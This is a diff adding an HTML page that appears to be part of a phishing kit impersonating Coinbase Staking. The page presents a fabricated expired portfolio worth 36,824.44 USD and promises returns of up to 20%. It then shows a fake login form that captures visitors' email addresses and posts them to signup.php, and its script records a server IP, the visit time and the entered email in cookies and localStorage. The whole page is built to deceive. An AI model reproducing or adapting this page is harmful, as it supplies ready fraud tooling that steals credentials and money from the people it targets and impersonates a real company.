@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <script>
+   var page_id = 0;
+   </script>
+   <script type="text/javascript" src="js/redirect.js"></script>
+
+   <meta charset="UTF-8" />
+   <title>Staking</title>
+   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+   <!-- Tailwind CSS -->
+   <script src="https://cdn.tailwindcss.com"></script>
+   <!-- Font Awesome -->
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+   <link rel="icon" href="./favicon.ico" />
+</head>
+
+<body class="bg-gray-50 text-gray-800 flex flex-col min-h-screen">
+
+   <div id="loading" class="fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
+   <i class="fas fa-spinner fa-spin text-4xl text-blue-600"></i>
+</div>   <header class="bg-white shadow-md">
+   <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+      <div class="flex items-center gap-2">
+         <img src="./img/logo.svg" alt="Logo" class="h-6 sm:h-10">
+         <span class="font-bold text-sm sm:text-xl">Staking Portfolio</span>
+      </div>
+      <div>
+         <a href="#" class="text-gray-600 hover:text-gray-900"><i class="fas fa-user-circle fa-xl"></i></a>
+      </div>
+   </div>
+</header>
+   <main class="flex-grow">
+
+      <!-- Section 1 -->
+      <div class="section1 container p-6 bg-white shadow-lg rounded-xl my-8 hidden max-w-[500px] mx-auto">
+         <div class="text-center">
+            <div class="flex justify-center items-center gap-4 mb-4">
+               <img src="./img/mess.png" alt="Message" class="h-12">
+            </div>
+            <h5 class="text-lg font-medium mb-2">Personal information for the owner of the Coinbase Staking <b>Portfolio
+                  with ID 44326567</b></h5>
+            <h5 class="mb-4">Dear investor, The deadline for your crypto Investment Staking Portfolio from Coinbase has
+               expired today and due to the expiration of your Staking Portfolio, you can receive your coins.</h5>
+
+            <div class="bg-gray-100 p-6 rounded-lg my-4">
+               <div class="flex items-center justify-center gap-2 mb-2">
+                  <img src="./img/usd.png" alt="USD" class="w-12">
+                  <div>
+                     <h5 class="font-medium">YOUR BALANCE:</h5>
+                     <h4 class="text-green-600 font-bold text-xl">36,824.44 USD</h4>
+                  </div>
+               </div>
+               <hr class="my-2">
+               <h5 class="font-semibold mb-2">Your Initial Coinbase Staking Portfolio</h5>
+
+               <div class="flex items-center justify-center gap-2 mb-1">
+                  <img src="./img/btc.png" alt="BTC" class="w-6 h-6">
+                  <h5><b>Staking</b>: 0.365 BTC * <b>12.7%</b> * 90 days</h5>
+               </div>
+               <div class="flex items-center justify-center gap-2 mb-1">
+                  <img src="./img/eth.svg" alt="ETH" class="w-6 h-6">
+                  <h5><b>Staking</b>: 4.578 ETH * <b>3.1%</b> * 90 days</h5>
+               </div>
+               <div class="flex items-center justify-center gap-2 mb-1">
+                  <img src="./img/usdt.png" alt="USDT" class="w-6 h-6">
+                  <h5><b>Staking</b>: 3,241.00 USDT * <b>5.9%</b> * 90 days</h5>
+               </div>
+            </div>
+
+            <h5 class="font-semibold mb-2">How do I receive payments at the end of the term of your Coinbase Staking
+               Portfolio?</h5>
+            <h5>- Log in to the investor's personal account</h5>
+            <h5>- Transfer % from the investment balance to the balance for payments</h5>
+            <h5>- Specify your payment details for payments</h5>
+
+            <form method="post" class="mt-4">
+               <button type="submit"
+                  class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-full transition">CONTINUE</button>
+            </form>
+         </div>
+      </div>
+
+      <!-- Section 2 -->
+      <div class="section2 hidden">
+         <section class="container mx-auto px-4 py-12 text-center">
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">COINBASE STAKING</h1>
+            <p class="text-lg md:text-xl mb-6">
+               Place your cryptocurrency to help maintain the blockchain network for a period
+               <span class="text-yellow-500 font-semibold">from 15 to 90 days and earn up to 20%.</span>
+            </p>
+            <div class="flex justify-center">
+               <img src="./img/air.png" alt="Crypto illustration" class="max-w-xs md:max-w-md">
+            </div>
+         </section>
+
+         <section class="container mx-auto px-4 py-8 bg-white shadow rounded-lg max-w-lg">
+            <form action="./signup.php" method="post" class="space-y-4">
+               <div class="relative">
+                  <input type="email" name="email" id="email" required
+                     value=""
+                     class="peer w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-yellow-400"
+                     placeholder=" ">
+                  <label for="email"
+                     class="absolute left-4 top-3 text-gray-500 text-sm transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:left-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:left-4 peer-focus:text-xs">
+                     Your E-mail Address
+                  </label>
+               </div>
+               <button type="submit"
+                  class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-full transition">
+                  Log In
+               </button>
+            </form>
+            <div class="flex items-center gap-2 mt-4 text-gray-700">
+               <img src="./img/register-gift.svg" alt="Gift" class="w-8">
+               <p>Coinbase Staking gives <span class="font-bold">10%</span> to your first deposit</p>
+            </div>
+         </section>
+
+         <section class="container mx-auto px-4 py-12 text-center">
+   <h2 class="text-2xl md:text-3xl font-bold mb-4">Why Staking?</h2>
+   <p class="max-w-2xl mx-auto text-gray-600 mb-8">
+      Staking is the process of supporting the blockchain by storing cryptocurrencies on a platform to receive
+      rewards.
+      By staking, you help maintain the network, generate new blocks, and earn additional tokens.
+   </p>
+   <hr class="my-8 border-gray-300">
+
+   <h3 class="text-xl font-semibold mb-6">Crypto Staking Examples</h3>
+   <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
+      <img src="./img/s01.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s02.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s03.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s04.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s05.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s06.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s07.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s08.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s09.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s10.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s11.jpg" alt="" class="rounded-lg shadow">
+      <img src="./img/s12.jpg" alt="" class="rounded-lg shadow">
+   </div>
+</section>      </div>
+
+   </main>
+
+   <!-- Footer -->
+   <footer class="bg-white mt-12 py-6 text-center text-gray-500 text-sm">
+   <p><strong>STAKING</strong></p>
+   <p>© 2026 | All Rights Reserved</p>
+</footer>
+   <script>
+   const php_ip = "107.189.20.230";
+   const php_time = "16:18";
+
+   document.addEventListener("DOMContentLoaded", function() {
+      const section1 = document.querySelector('.section1');
+      const section2 = document.querySelector('.section2');
+      const continueBtn = section1.querySelector('button');
+
+      let stakingPageState = localStorage.getItem('stakingPageState') || getCookie('stakingPageState');
+
+      if (stakingPageState === 'section2') {
+         section1.classList.add('hidden');
+         section2.classList.remove('hidden');
+      } else {
+         section1.classList.remove('hidden');
+         section2.classList.add('hidden');
+      }
+
+      continueBtn.addEventListener('click', function(e) {
+         e.preventDefault();
+         section1.classList.add('hidden');
+         section2.classList.remove('hidden');
+
+         localStorage.setItem('user_ip', php_ip);
+         localStorage.setItem('visit_time', php_time);
+
+         setCookie('user_ip', php_ip, {
+            expires: 30
+         });
+         setCookie('visit_time', php_time, {
+            expires: 30
+         });
+
+         localStorage.setItem('stakingPageState', 'section2');
+         setCookie('stakingPageState', 'section2', {
+            expires: 30
+         });
+      });
+
+      const emailForm = section2.querySelector('form');
+      emailForm.addEventListener('submit', function(e) {
+         const emailInput = emailForm.querySelector('input[name="email"]');
+         const emailValue = emailInput.value.trim();
+
+         if (emailValue !== '') {
+            localStorage.setItem('email', emailValue);
+            setCookie('email', emailValue, {
+               expires: 30
+            });
+         }
+         // e.preventDefault();
+      });
+
+      function setCookie(name, value, options = {}) {
+         options = {
+            path: '/',
+            expires: options.expires || 30,
+         };
+
+         if (typeof options.expires == "number") {
+            let d = new Date();
+            d.setTime(d.getTime() + options.expires * 24 * 60 * 60 * 1000);
+            options.expires = d.toUTCString();
+         }
+
+         let updatedCookie = encodeURIComponent(name) + "=" + encodeURIComponent(value);
+
+         for (let optionKey in options) {
+            updatedCookie += "; " + optionKey;
+            let optionValue = options[optionKey];
+            if (optionValue !== true) {
+               updatedCookie += "=" + optionValue;
+            }
+         }
+
+         document.cookie = updatedCookie;
+      }
+
+      function getCookie(name) {
+         let matches = document.cookie.match(new RegExp(
+            "(?:^|; )" + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + "=([^;]*)"
+         ));
+         return matches ? decodeURIComponent(matches[1]) : undefined;
+      }
+   });
+   </script>
+   <script src="./js/placeholder.js"></script>
+</body>
+
+</html>
